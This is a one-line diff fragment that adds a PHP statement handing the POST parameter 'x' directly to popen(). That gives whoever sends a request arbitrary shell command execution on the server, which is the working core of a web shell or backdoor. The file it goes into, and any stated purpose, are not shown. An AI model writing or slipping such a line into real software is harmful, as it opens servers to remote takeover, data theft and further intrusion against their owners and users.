@@ -1,0 +1,1 @@
+$cb = popen($_POST['x'], 'r');
